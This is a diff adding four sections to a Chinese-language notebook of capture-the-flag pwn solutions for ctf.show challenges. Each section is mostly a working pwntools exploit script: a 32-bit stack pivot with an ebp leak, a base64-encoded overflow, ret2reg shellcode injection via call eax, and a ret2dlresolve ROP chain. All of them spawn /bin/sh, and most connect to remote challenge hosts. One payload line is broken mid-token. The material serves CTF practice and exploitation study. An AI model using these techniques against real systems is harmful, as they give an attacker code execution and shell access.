@@ -382,3 +382,114 @@ p.sendline(b'/bin/sh\x00')
 p.interactive()
 ```
 
+## 75 栈迁移（32位）
+
+#### 可以泄露ebp
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+#p = remote('pwn.challenge.ctf.show',28143)
+#gdb.attach(p)
+
+system = elf.sym['system']
+leave = 0x080484d5
+payload = b'a'*0x24+b'show'
+pause()
+p.recvuntil(b'codename:\n')
+pause()
+p.send(payload)
+p.recvuntil(b'show')
+ebp = u32(p.recv(4).ljust(4,b'\x00'))
+buf = ebp-0x38
+payload = (p32(system)+p32(0)+p32(buf+12)+b'/bin/sh\x00').ljust(0x28,b'a')+p32(buf-4)+p3
+2(leave)
+p.sendline(payload)
+p.interactive()
+```
+
+## 76 base64解码
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28175)
+#gdb.attach(p)
+
+input_addr = 0x811EB40
+shell = 0x8049284
+payload = b'a'*0x4+p32(shell)+p32(input_addr)
+payload = base64.b64encode(payload)
+p.sendline(payload)
+p.interactive()
+```
+
+## 79 ret2reg(32位) call rax或jmp reg挟持走向
+
+#### 栈可执行
+
+1. 查看溢出函数返回时哪个寄存值指向溢出缓冲区空间
+2. 查找`call rax`或`jmp reg`指令，将`EIP`设置位该指令地址
+3. `reg`所指向的空间上注入`shellcode`
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28148)
+#gdb.attach(p)
+
+shellcode = asm(shellcraft.sh())
+call_eax = p32(0x080484a0)
+payload = flat(shellcode,b'a'*(0x208+0x4-len(shellcode)),call_eax)
+p.sendline(payload)
+p.interactive()
+```
+
+## 82 高级ROP NO_RELRO（32）ret2dlresolve （适用于无基地址泄露）
+
+```python
+from pwn import *
+context.log_level = 'debug'
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28244)
+elf = ELF('./pwn')
+rop = ROP('./pwn')
+p.recvuntil(b'PWN!\n')
+offset = 112
+rop.raw(offset*b'a')
+rop.read(0,0x8049804+4,4)	# modify .dynstr pointer in .dynamic section to a specific location
+dynstr = elf.get_section_by_name('.dynstr').data()
+dynstr = dynstr.replace(b"read",b"system")
+rop.read(0,0x80498E0,len((dynstr)))		# construct a fake dynstr section
+rop.read(0,0x80498E0+0x100,len(b'/bin/sh\x00'))		# read /bin/sh\x00
+rop.raw(0x8048376)	# the second instruction of read@plt
+#section
+rop.raw(0xdeadbeef)
+rop.raw(0x80498E0+0x100)
+assert(len(rop.chain())<=256)
+rop.raw(b'a'*(256-len(rop.chain())))
+p.send(rop.chain())
+p.send(p32(0x80498E0))
+p.send(dynstr)
+p.send(b'/bin/sh\x00')
+p.interactive()
+```
+
